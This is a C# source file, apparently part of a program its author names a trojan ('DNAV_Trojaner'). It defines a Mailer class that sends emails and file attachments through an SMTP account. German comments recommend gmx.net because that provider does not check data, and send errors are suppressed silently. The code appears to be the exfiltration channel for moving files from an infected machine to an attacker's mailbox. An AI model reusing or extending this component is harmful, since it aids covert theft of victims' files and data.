using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Mail;

namespace DNAV_Trojaner {
    //gmx.net Empfehlung, da diese Seite keine Daten prüft
    //https://hilfe.gmx.net/pop-imap/einschalten.html
    class Mailer {
        public string toEmail;
        public string fromEmail;
        public string username;
        public string pw;
        public int port;
        public string smtpHost;
      
        public Mailer(string mtoEmail, string mfromEmail, string musername, string mpw, int mport, string msmtpHost)
        {               
            fromEmail = mfromEmail;
            username = musername;
            pw = mpw;
            port = mport;
            smtpHost = msmtpHost;     
            toEmail = mtoEmail;        
        }
      
        private void sender(MailMessage mail, string subject, string msg) {
            SmtpClient SmtpServer = new SmtpClient();
            SmtpServer.UseDefaultCredentials = false;
            SmtpServer.Credentials = new System.Net.NetworkCredential(username, pw);
            SmtpServer.DeliveryMethod = SmtpDeliveryMethod.Network;
            SmtpServer.EnableSsl = true;
            mail.To.Add(toEmail);
            mail.From = new MailAddress(fromEmail);          
            mail.Subject = subject;  
            mail.Body = msg;
            SmtpServer.Host = smtpHost;
            SmtpServer.Port = port;
            SmtpServer.DeliveryMethod = System.Net.Mail.SmtpDeliveryMethod.Network;
            try {
                SmtpServer.Send(mail);
            } catch (Exception ex) {
                //Console.WriteLine(ex);
            }
        }
        public void send(string sub, string msg) { //? Nur Betreff&Text
            MailMessage mail = new MailMessage();
            sender(mail, sub, msg);
        }
        public void send(string sub, string msg, string path) { //? Betreff&Text mit Anhang
            MailMessage mail = new MailMessage();
            mail.Attachments.Add(new Attachment(path));
            sender(mail, sub, msg);
        }
           
        
    }
}
